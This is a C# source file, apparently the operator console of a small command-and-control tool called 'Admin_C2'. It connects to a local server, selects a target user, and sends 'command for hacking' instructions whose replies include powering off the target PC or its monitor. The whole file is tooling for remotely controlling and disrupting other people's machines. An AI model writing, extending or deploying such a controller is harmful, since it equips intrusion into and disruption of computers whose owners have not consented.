using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.IO.Pipes;

namespace Admin_C2
{
    internal class Program
    {
        
        static private int MaxReadByte = 2024;
        static private void Write(Stream stream, string text)
        {
            if (stream.CanWrite)
            {
                byte[] buffer = Encoding.UTF8.GetBytes(text);
                stream.Write(buffer, 0, buffer.Length);
                stream.Flush();
            }
        }
        static private string Read(Stream stream)
        {
            string requst = "not connect";
            if (stream.CanRead)
            {
                byte[] buffer = new byte[MaxReadByte];
                int size = stream.Read(buffer, 0, buffer.Length);
                requst = Encoding.UTF8.GetString(buffer, 0, size);
            }
            return requst;

        }
        static void Main()
        {
           
            Console.WriteLine("Start");
        start:
            string host = "";
            int port = 00000;
            try
            {
                host = "127.0.0.1";
                port = 25565;
                using (TcpClient client = new TcpClient())
                {
                    client.Connect(host, port);
                    using (Stream stream = client.GetStream())
                    {

                        if (client.Connected)
                        {
                            string username = "admin_0000";
                            Write(stream, username);
                            Console.WriteLine(Read(stream));
                            while (true)
                            {
                                f:
                                Console.WriteLine("Enter the username");
                                string command = Console.ReadLine();
                                if (command==null ||command == "") 
                                {
                                    goto f;
                                }
                                Write(stream, command);
                                string answer = Read(stream);
                                if (answer.Equals("found"))
                                {
                                    while (true)
                                    {
                                        Console.WriteLine("command for hacking: " + command);
                                        Write(stream, Console.ReadLine());
                                        string aser = Read(stream);
                                        if (aser.Equals("pc_off"))
                                        {
                                            Console.WriteLine("pc_off");
                                        }
                                        else if (aser.Equals("pc_off_on"))
                                        {
                                            Console.WriteLine("pc_off_on");
                                        }
                                        else if (aser.Equals("monitor_off"))
                                        {
                                            Console.WriteLine("monitor_off");
                                        }
                                        else if (aser.Equals("ERROR_ANSWER"))
                                        {
                                            Console.WriteLine("not command");
                                        }
                                    }
                                }
                                else 
                                {
                                    Console.WriteLine(answer);
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception e) { goto start; }
        }
    }
}
